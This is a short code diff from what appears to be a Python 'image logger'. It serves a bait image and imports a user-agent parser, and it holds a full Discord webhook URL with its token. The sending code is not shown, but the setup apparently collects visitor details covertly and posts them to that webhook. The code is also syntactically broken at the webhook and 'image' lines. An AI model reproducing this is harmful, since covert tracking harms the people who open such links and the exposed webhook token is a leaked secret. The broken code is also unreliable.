@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-"webhook": = 'https://discord.com/api/webhooks/1513448847664349284/GW2Zxjw2FNhxBFx0x6c_mEnadkn7av5yIv7Vu80TlVSTK2s2t4A6dRGNUSNCFjZ7SYWg',
+webhook = 'https://discord.com/api/webhooks/1513448847664349284/GW2Zxjw2FNhxBFx0x6c_mEnadkn7av5yIv7Vu80TlVSTK2s2t4A6dRGNUSNCFjZ7SYWg',
 "image": "https://thf.bing.com/th/id/OIP.T4QxrLPu8djTx12rCp56nAHaEo?w=256&h=180&c=7&r=0&o=7&cb=thfc1falcon2&pid=1.7&rm=3",
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
